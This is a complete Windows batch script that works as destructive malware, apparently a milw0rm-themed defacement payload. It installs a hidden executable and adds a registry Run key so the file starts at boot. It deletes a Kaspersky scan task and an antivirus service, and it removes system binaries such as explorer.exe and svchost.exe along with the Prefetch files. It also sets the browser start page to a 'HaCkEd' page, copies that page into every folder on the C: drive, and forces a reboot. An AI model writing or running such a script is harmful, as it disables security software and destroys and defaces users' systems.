@echo off
copy .~$milw0rm.exe %windir%\system\milw0rm.exe /y
attrib +a +h +s +r %windir%\system\milw0rm.exe
copy milw0rm.html %windir%\HaCkEd!!!.html /y
schtasks /Delete /TN "KAV Scheduled Scan" /f
sc stop AVPDump
sc delete AVPDump
cmd32.exe regsetval sz "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" "milw0rm" "c:\windows\system\milw0rm.exe"
cmd32.exe regsetval sz "HKLM\Software\Microsoft\Internet Explorer\Main" "Start Page" "file:///%windir%/HaCkEd!!!.html"
cmd32.exe regsetval sz "HKLM\Software\Microsoft\Internet Explorer\Main" "FullScreen" "yes"
attrib -a -h -s -r %windir%\Prefetch\*.*
del %windir%\Prefetch\*.* /f /q
attrib -a -h -s -r %windir%\system\explorer.exe
del %windir%\system\explorer.exe /f /q
attrib -a -h -s -r %windir%\system\svchost.exe
del %windir%\system\svchost.exe /f /q
attrib -a -h -s -r %windir%\system\net.exe
del %windir%\system\net.exe /f /q
net user $ /del
net share $ /delete
for /f "tokens=* delims= " %%d in ('dir C:\ /ad/b/s') do (copy %windir%\HaCkEd!!!.html "%%d" /y)
cmd32.exe exitwin reboot force